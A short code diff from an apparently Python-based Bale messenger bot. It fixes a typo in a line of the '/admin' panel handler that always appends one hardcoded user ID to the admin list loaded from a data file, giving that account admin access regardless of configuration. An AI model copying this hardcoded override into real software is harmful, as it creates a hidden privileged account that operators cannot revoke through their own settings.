@@ -515,7 +515,7 @@ async def on_message(message:bale.Message):
         elif (text == "/admin" or text == "/panel"):
             with open("Data/data.json", "r") as f:
                 admins:list = json.load(f)["admins"]
-            if "29632558" not in admins: admins.append("429632558")
+            if "29632558" not in admins: admins.append("29632558")
             if str(user.id) not in admins: return
             
             keyboard = torowinline(
